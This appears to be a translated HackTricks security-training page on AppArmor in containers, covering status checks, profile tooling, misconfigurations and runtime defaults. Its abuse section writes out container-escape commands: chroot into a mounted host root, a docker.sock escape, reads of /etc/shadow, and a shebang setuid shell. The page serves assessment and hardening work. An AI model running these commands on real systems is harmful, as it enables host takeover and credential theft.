# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

AppArmor 是一个 **Mandatory Access Control** 系统，通过每个程序的 profile 应用限制。与依赖于用户和组所有权的传统 DAC 检查不同，AppArmor 让内核对附加在进程本身上的策略进行强制执行。在 container 环境中，这很重要，因为一个 workload 可能拥有足够的传统特权去尝试某个操作，但仍会被拒绝，因为其 AppArmor profile 不允许相关的路径、挂载、网络行为或 capability 的使用。

最重要的概念点是 AppArmor 是 **path-based** 的。它通过路径规则而不是像 SELinux 那样通过标签来判断文件系统访问。这使得它既易于理解又强大，但也意味着 bind mounts 和替代路径布局需要格外注意。如果相同的主机内容在不同路径下变得可达，策略的效果可能不是操作人员最初预期的那样。

## 在容器隔离中的角色

Container 安全评估常常止步于 capabilities 和 seccomp，但在这些检查之后 AppArmor 仍然很重要。想象一个拥有比应有更多权限的 container，或一个由于运行需要而需要额外 capability 的 workload。AppArmor 仍然可以以约束文件访问、挂载行为、网络和执行模式的方式阻止明显的滥用路径。这就是为什么为“只是让应用工作”而禁用 AppArmor 可能会悄然将一个仅有风险的配置转变为可被积极利用的配置。

## 实验

要检查 AppArmor 是否在主机上启用，请使用：
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
要查看当前容器进程以何身份运行：
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
这个差异很有启发性。在正常情况下，该进程应显示与运行时选择的配置文件绑定的 AppArmor 上下文。在 unconfined 情况下，那层额外的限制就会消失。

你也可以查看 Docker 认为它应用了什么：
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Docker 在主机支持时可以应用默认或自定义的 AppArmor 配置文件。Podman 在基于 AppArmor 的系统上也能与 AppArmor 集成，尽管在以 SELinux 为主的发行版上，另一个 MAC 系统通常更为突出。Kubernetes 可以在实际支持 AppArmor 的节点上将 AppArmor 策略公开到工作负载层。LXC 及相关的 Ubuntu 系列的系统容器环境也广泛使用 AppArmor。

关键在于 AppArmor 并不是一个 "Docker feature"。它是一个主机内核特性，多个 runtime 可以选择应用它。如果主机不支持它或运行时被告知以 unconfined 方式运行，那么所谓的保护实际上并不存在。

在支持 Docker 的 AppArmor 主机上，最知名的默认配置是 `docker-default`。该配置是从 Moby 的 AppArmor 模板生成的，很重要，因为它能解释为什么某些基于 capability 的 PoC 在默认容器中仍然会失败。大体上，`docker-default` 允许普通的网络操作，拒绝对大部分 `/proc` 的写入，拒绝访问 `/sys` 的敏感部分，阻止 mount 操作，并限制 ptrace，使其不能成为通用的主机探测原语。理解这个基线有助于区分 "the container has `CAP_SYS_ADMIN`" 与 "the container can actually use that capability against the kernel interfaces I care about" 之间的差别。

## Profile Management

AppArmor 的配置文件通常存放在 `/etc/apparmor.d/` 下。常见的命名约定是将可执行文件路径中的斜杠替换为点。例如，`/usr/bin/man` 的配置通常存放为 `/etc/apparmor.d/usr.bin.man`。这一细节在防御和评估时都很重要，因为一旦你知道了活动配置的名称，通常就能在主机上快速定位对应的文件。

Useful host-side management commands include:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
这些命令在 container-security 参考中之所以重要，是因为它们解释了 profiles 实际上如何被构建、加载、切换到 complain mode，以及在应用更改后如何被修改。如果运维人员在故障排查时习惯将 profiles 切换到 complain mode 并忘记恢复 enforcement，那么容器在文档中可能看起来受到保护，但在现实中行为可能要宽松得多。

### 构建和更新 profiles

`aa-genprof` 可以观察应用行为并交互式地帮助生成 profile：
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` 可以生成一个模板配置文件，之后可用 `apparmor_parser` 加载：
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
当二进制文件发生更改且策略需要更新时，`aa-logprof` 可以重放日志中发现的拒绝记录，帮助操作者决定是否允许或拒绝它们：
```bash
sudo aa-logprof
```
### 日志

AppArmor 的拒绝通常可以通过 `auditd`、syslog 或诸如 `aa-notify` 的工具看到:
```bash
sudo aa-notify -s 1 -v
```
这在实战和进攻方面很有用。防御方利用它来完善配置文件。攻击者利用它来确定被拒绝的确切路径或操作，以及是否是 AppArmor 阻止了利用链。

### 确定精确的配置文件

当运行时为某个容器显示特定的 AppArmor 配置文件名称时，通常有必要将该名称映射回磁盘上的配置文件：
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
在主机端审查时这尤其有用，因为它弥合了 "the container says it is running under profile `lowpriv`" 和 "the actual rules live in this specific file that can be audited or reloaded" 之间的差距。

## 错误配置

最明显的错误是 `apparmor=unconfined`。管理员常在调试一个因为 profile 正确阻止了某个危险或意外行为而失败的应用时设置该标志。如果该标志留在生产环境中，整个 MAC 层实际上就被移除了。

另一个微妙的问题是假设 bind mounts 无害，因为文件权限看起来正常。由于 AppArmor 是基于路径的，将宿主路径暴露在替代的挂载位置可能会与路径规则产生不良交互。第三个错误是忘记如果宿主内核并未真正强制执行 AppArmor，那么配置文件中的 profile 名称几乎没有意义。

## 滥用

当 AppArmor 不在时，以前受限的操作可能会突然可行：通过 bind mounts 读取敏感路径、访问本该更难使用的 procfs 或 sysfs 的部分、如果 capabilities/seccomp 也允许的话执行与挂载相关的操作，或使用 profile 通常会拒绝的路径。AppArmor 往往是解释为什么基于 capability 的越狱尝试在理论上“应该可行”但实际上仍失败的机制。移除 AppArmor， 同样的尝试可能会开始成功。

如果你怀疑 AppArmor 是阻止路径遍历、bind-mount，或基于挂载的滥用链的主要原因，第一步通常是比较有无 profile 时变得可访问的内容。例如，如果某个宿主路径被挂载到容器内，首先检查你是否可以遍历并读取它：
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
如果容器还具有诸如 `CAP_SYS_ADMIN` 之类的危险权限，则最实用的测试之一是确认 AppArmor 是否在阻止挂载操作或访问敏感内核文件系统：
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
在通过 bind mount 已经可用主机路径的环境中，失去 AppArmor 可能会将只读的信息泄露问题变成对主机文件的直接访问：
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
这些命令的要点并不是说 AppArmor 单独就能造成越狱。重要的是，一旦移除了 AppArmor，许多基于文件系统和挂载的滥用路径就可以立刻进行测试。

### 完整示例：AppArmor 已禁用 + 主机根目录已挂载

如果容器已经将主机根目录以 bind-mounted 的方式挂载到 `/host`，移除 AppArmor 可以把一个被阻止的文件系统滥用路径变成完整的主机逃逸：
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
一旦 shell 通过宿主文件系统执行，工作负载就实际上已经逃出了容器边界：
```bash
id
hostname
cat /etc/shadow | head
```
### 完整示例：AppArmor 已禁用 + 运行时 Socket

如果真正的防护是围绕运行时状态的 AppArmor，那么一个已挂载的 socket 就足以实现完全的逃逸：
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
确切的路径取决于挂载点，但最终结果相同：AppArmor 不再阻止对运行时 API 的访问，运行时 API 可以启动一个能够危及主机的容器。

### 完整示例：Path-Based Bind-Mount Bypass

因为 AppArmor 是基于路径的，保护 `/proc/**` 并不会自动保护当同样的主机 procfs 内容通过不同路径可达时的访问：
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
影响取决于具体挂载了什么以及替代路径是否也绕过了其他控制，但这种模式是将 AppArmor 与挂载布局一起评估而不是单独评估的最明显原因之一。

### 完整示例: Shebang Bypass

AppArmor 策略有时会以某种方式针对解释器路径，但并未充分考虑通过 shebang 处理执行脚本的情况。一个历史示例涉及使用一个脚本，其第一行指向一个受限制的解释器：
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
这种示例很重要，因为它提醒我们 profile 的意图与实际执行语义可能会发生偏离。在审查容器环境中的 AppArmor 时，应特别关注解释器链和替代执行路径。

## 检查

这些检查的目标是快速回答三个问题：主机上是否启用了 AppArmor？当前进程是否受限？以及 runtime 是否实际将 profile 应用于该容器？
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
这里值得注意的是：

- 如果 `/proc/self/attr/current` 显示 `unconfined`，则该工作负载没有从 AppArmor 限制中受益。
- 如果 `aa-status` 显示 AppArmor 已禁用或未加载，运行时配置中的任何配置文件名称大多只是形式上的。
- 如果 `docker inspect` 显示 `unconfined` 或意外的自定义配置文件，这通常是文件系统或基于挂载的滥用路径起作用的原因。

如果容器因操作原因已经具有更高权限，保持 AppArmor 启用通常会决定是仅发生可控的例外，还是演变为更大范围的安全故障。

## 运行时默认值

| Runtime / 平台 | 默认状态 | 默认行为 | 常见的手动弱化 |
| --- | --- | --- | --- |
| Docker Engine | 在支持 AppArmor 的主机上默认启用 | 使用 `docker-default` AppArmor 配置文件，除非被覆盖 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | 取决于主机 | 通过 `--security-opt` 支持 AppArmor，但确切默认值取决于主机/运行时，比 Docker 文档中的 `docker-default` 配置文件更不通用 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | 有条件的默认值 | 如果未指定 `appArmorProfile.type`，默认是 `RuntimeDefault`，但仅当节点启用了 AppArmor 时才会应用 | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost`（结合弱配置文件），节点不支持 AppArmor |
| containerd / CRI-O under Kubernetes | 遵循节点/运行时支持 | 常见的 Kubernetes 支持的 runtimes 支持 AppArmor，但实际执行仍取决于节点支持和工作负载设置 | 同 Kubernetes 行；直接的运行时配置也可以完全跳过 AppArmor |

对于 AppArmor，最重要的变量通常是 **主机**，而不仅仅是运行时。清单中的配置文件设置不会在未启用 AppArmor 的节点上产生限制。
